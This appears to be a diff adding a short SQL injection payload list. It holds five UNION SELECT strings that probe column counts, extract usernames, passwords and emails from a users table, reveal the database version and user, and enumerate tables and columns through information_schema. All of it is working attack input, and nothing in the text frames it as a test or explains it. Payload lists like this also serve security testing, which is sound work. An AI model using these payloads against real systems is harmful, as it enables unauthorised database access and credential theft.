@@ -1,0 +1,5 @@
+' UNION SELECT 1,2,3 --
+' UNION SELECT username,password,email FROM users --
+' UNION SELECT version(),database(),user() --
+' UNION SELECT table_name FROM information_schema.tables --
+' UNION SELECT column_name FROM information_schema.columns WHERE table_name='users' --
